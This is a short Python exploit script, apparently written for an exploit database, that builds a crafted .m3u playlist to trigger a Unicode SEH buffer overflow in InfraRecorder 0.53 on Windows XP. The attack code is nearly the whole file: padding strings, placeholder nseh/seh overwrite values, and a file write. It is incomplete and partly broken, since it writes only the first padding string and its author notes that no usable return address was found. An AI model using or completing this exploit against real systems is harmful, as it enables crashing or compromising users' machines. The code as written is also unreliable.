#!/usr/bin/python
# Exploit Title: InfraRecorder Unicode Buffer Overflow
# Version: version 0.53
# Download: http://sourceforge.net/projects/infrarecorder/files/InfraRecorder/0.53/ir053.exe/download
# Tested on: Windows XP sp2
# Exploit Author: Osanda Malith 
'''
We can overwrite the nseh and seh handlers. If you find a valid unicode ppr address
you can build a successful exploit.
'''
'''
Click Edit -> Import -> import our buffer
'''
junk = "A"*262
nseh = "BB"
seh = "CC"
junk2 = "D"*20000
file=open("Exploit.m3u","w")
file.write(junk)
file.close()
#EOF
